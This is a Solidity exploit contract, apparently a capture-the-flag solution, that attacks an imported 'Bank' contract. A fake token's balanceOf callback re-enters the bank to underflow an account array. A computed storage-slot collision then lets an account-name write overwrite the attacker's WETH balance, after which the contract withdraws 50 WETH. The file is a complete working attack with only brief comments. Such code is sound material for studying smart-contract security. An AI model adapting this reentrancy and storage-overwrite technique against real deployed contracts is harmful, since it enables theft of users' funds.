pragma solidity ^0.4.0;

import "./Bank.sol";
import 'hardhat/console.sol';


contract BankAttacker {
    Bank public bank;
    uint256 public renter;
    uint256 public accountId;
    address public weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor(address _bank) public payable {
      bank = Bank(_bank);
      accountId = 0;
    }

    function attackBank() public {
      // make accounts[msg.sender][accountId].length overflow
      bank.depositToken(0, address(this), accountId);

      // calculate attack id
      uint256 attackId = getAttackAccountId(accountId);
      console.log("Get attack id %d", attackId);

      // set value to accounts[msg.sender][attackId].accountName is equal
      // set balance to accounts[msg.sender][accountId].balances[WETH]
      string memory toWei = "AAAAAAAAAAA";
      bank.setAccountName(attackId, toWei);
      console.log("Account %d weth balance is %d", accountId, bank.getAccountBalance(accountId, weth));

      // withdraw WETH of bank
      bank.withdrawToken(0, weth, 50000000000000000000);
    }

    function balanceOf(address user) public returns (uint) {
      if (renter == 0) {
        // length = -1, unique =0
        renter ++;
        bank.withdrawToken(0, address(this), 0);
      } else if (renter == 1){
        // length = 0, unique =1
        renter ++;
        bank.depositToken(0, address(this), 0);
      } else if (renter == 2) {
        // length = 0, unique =0
        renter ++;
        bank.closeLastAccount();
      }
      return 0;
    }

    function transferFrom(address src, address dst, uint qty) public returns (bool) {
      return true;
    }

    function transfer(address dst, uint qty) public returns (bool) {
      return true;
    }


    function getAttackAccountId(uint256 id) internal returns(uint256) {
      // accounts[msg.sender][accountId].accountName slot
      uint256 accountSlot = getArrayLocation(getMapLocation(2, uint256(address(this))), id, 3);

      // accounts[msg.sender][attackId].balance[weth] slot
      uint256 wethBalanceSlot = getMapLocation(accountSlot + 2, uint256(weth));

      // accountStructSlot(accountId) == balanceSlot
      // <=> keccak(keccak(our_addr . 2)) + 3 * accountId == balanceSlot
      // <=> accountId = [balanceSlot - keccak(keccak(our_addr . 2))] / 3
      require((wethBalanceSlot - accountSlot) % 3 == 0, "change other contract address");
      return (wethBalanceSlot - accountSlot) / 3;
    }

    function getArrayLocation(
        uint256 slot,
        uint256 index,
        uint256 elementSize
    ) public pure returns (uint256) {
        return
            uint256(keccak256(abi.encodePacked(slot))) + (index * elementSize);
    }

    function getMapLocation(uint256 slot, uint256 key)
        public
        pure
        returns (uint256)
    {
        return uint256(keccak256(abi.encodePacked(key, slot)));
    }


}
